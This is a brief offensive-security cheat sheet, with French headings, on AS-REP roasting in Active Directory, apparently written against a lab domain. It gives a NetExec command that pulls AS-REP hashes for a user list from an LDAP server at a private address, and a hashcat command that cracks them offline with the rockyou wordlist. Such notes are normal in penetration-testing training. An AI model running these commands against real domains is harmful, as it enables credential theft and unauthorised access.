# AS-REP roasting

## Extraction&#x20;

```bash
nxc ldap 192.168.56.11 -u north_users.txt -p '' --asreproast asreproast.txt
```

## Cracker les hashs hors-ligne

```bash
hashcat -m18200 asreproast.txt /usr/share/wordlists/rockyou.txt
```
